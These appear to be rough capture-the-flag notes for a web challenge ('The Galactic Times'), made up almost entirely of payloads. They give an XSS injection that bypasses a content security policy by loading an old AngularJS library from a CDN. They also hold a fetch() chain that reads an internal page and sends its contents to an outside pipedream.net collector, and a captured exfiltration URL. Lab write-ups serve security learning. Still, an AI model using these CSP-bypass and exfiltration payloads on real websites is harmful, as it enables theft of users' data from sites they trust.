```json
{"feedback":"\"><script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js\"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"
}
```
 got xss to work

 https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

```js
fetch("http://127.0.0.1:1337/alien", {mode: "no-cors"}).then(response => response.text()).then(body=>window.location=("https://enlvqayobytkwn2.m.pipedream.net/?"+body.slice(body.search("CHTB"), body.search("CHTB")+50)))
```

escaped:

```js
fetch(\"http://127.0.0.1:1337/alien\", {mode: \"no-cors\"}).then(response => response.text()).then(body=>window.location=(\"https://enlvqayobytkwn2.m.pipedream.net/?\"+body.split(\'\n\')[18]))
```

substring did not work so....

```json

{"feedback":"\"><script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js\"></script> <div ng-app ng-csp>{{$eval.constructor('fetch(\"http://127.0.0.1:1337/alien\", {mode: \"no-cors\"}).then(response => response.text()).then(body=>window.location=(\"https://enlvqayobytkwn2.m.pipedream.net/?\"+body[body.search(\"CHTB\")]+body[body.search(\"CHTB\")+1]+body[body.search(\"CHTB\")+2]+body[body.search(\"CHTB\")+3]+body[body.search(\"CHTB\")+4]+body[body.search(\"CHTB\")+5]+body[body.search(\"CHTB\")+6]+body[body.search(\"CHTB\")+7]+body[body.search(\"CHTB\")+8]+body[body.search(\"CHTB\")+9]+body[body.search(\"CHTB\")+10]+body[body.search(\"CHTB\")+11]+body[body.search(\"CHTB\")+12]+body[body.search(\"CHTB\")+13]+body[body.search(\"CHTB\")+14]+body[body.search(\"CHTB\")+15]+body[body.search(\"CHTB\")+16]+body[body.search(\"CHTB\")+17]+body[body.search(\"CHTB\")+18]+body[body.search(\"CHTB\")+19]+body[body.search(\"CHTB\")+20]+body[body.search(\"CHTB\")+21]+body[body.search(\"CHTB\")+22]+body[body.search(\"CHTB\")+23]+body[body.search(\"CHTB\")+24]+body[body.search(\"CHTB\")+25]+body[body.search(\"CHTB\")+26]+body[body.search(\"CHTB\")+27]+body[body.search(\"CHTB\")+28]+body[body.search(\"CHTB\")+29]+body[body.search(\"CHTB\")+30]+body[body.search(\"CHTB\")+31]+body[body.search(\"CHTB\")+32]+body[body.search(\"CHTB\")+33]+body[body.search(\"CHTB\")+34]+body[body.search(\"CHTB\")+35]+body[body.search(\"CHTB\")+36]+body[body.search(\"CHTB\")+37]+body[body.search(\"CHTB\")+38]+body[body.search(\"CHTB\")+39]+body[body.search(\"CHTB\")+40]+body[body.search(\"CHTB\")+41]+body[body.search(\"CHTB\")+42]+body[body.search(\"CHTB\")+43]))')()}}</div>"
}
```

https://enlvqayobytkwn2.m.pipedream.net/?%3Chtmllang=%22en%22%3E%3Chead%3E%3Cmetacharset=%22UTF-8%22%3E%3Ctitle%3ETheGalacticTimes%3C/title%3E%3Cmetaname=%22viewport%22content=%22width=device-width,initial-scale=1,user-scalable=no%22%3E%3Clinkrel=%22icon%22href=%22/static/images/favicon.png%22%3E%3Clinkrel=%22stylesheet%22href=%22/static/css/bootstrap.min.css%22%3E%3Clinkrel=%22stylesheet%22href=%22/static/css/main.css%22%3E%3C/head%3E%3Cbody%3E%3Cdivclass=%27clouds%27%3E%3Cdivclass=%22main__wrapper%22%3E%3Cmain%3E%3Ch1%3E%3Cahref=%22/alien%22%3E%E2%8F%81%E2%8A%91%E2%9F%92%E2%98%8C%E2%8F%83%E2%8C%B0%E2%8F%83%E2%98%8A%E2%8F%81%E2%9F%9F%E2%98%8A%E2%8F%81%E2%9F%9F%E2%8B%94%E2%9F%92%E2%8C%87%3C/a%3E%3C/h1%3E%3Caside%3E%3Cdiv%3E%3Cdivclass=%22issue%22%3E%E2%9F%9F%E2%8C%87%E2%8C%87%E2%8E%8D%E2%9F%92

+body[body.search(\"CHTB\")+2]+body[body.search(\"CHTB\")+3]+body[body.search(\"CHTB\")+4]+body[body.search(\"CHTB\")+5]+body[body.search(\"CHTB\")+6]+body[body.search(\"CHTB\")+7]+body[body.search(\"CHTB\")+8]+body[body.search(\"CHTB\")+9]+body[body.search(\"CHTB\")+10]+body[body.search(\"CHTB\")+11]+body[body.search(\"CHTB\")+12]+body[body.search(\"CHTB\")+13]+body[body.search(\"CHTB\")+14]+body[body.search(\"CHTB\")+15]+body[body.search(\"CHTB\")+16]+body[body.search(\"CHTB\")+17]+body[body.search(\"CHTB\")+18]+body[body.search(\"CHTB\")+19]+body[body.search(\"CHTB\")+20]+body[body.search(\"CHTB\")+21]+body[body.search(\"CHTB\")+22]+body[body.search(\"CHTB\")+23]+body[body.search(\"CHTB\")+24]+body[body.search(\"CHTB\")+25]+body[body.search(\"CHTB\")+26]+body[body.search(\"CHTB\")+27]+body[body.search(\"CHTB\")+28]+body[body.search(\"CHTB\")+29]+body[body.search(\"CHTB\")+30]+body[body.search(\"CHTB\")+31]
+body[body.search(\"CHTB\")+32]+body[body.search(\"CHTB\")+33]+body[body.search(\"CHTB\")+34]+body[body.search(\"CHTB\")+35]+body[body.search(\"CHTB\")+36]+body[body.search(\"CHTB\")+37]+body[body.search(\"CHTB\")+38]+body[body.search(\"CHTB\")+39]+body[body.search(\"CHTB\")+40]+body[body.search(\"CHTB\")+41]+body[body.search(\"CHTB\")+42]+body[body.search(\"CHTB\")+43]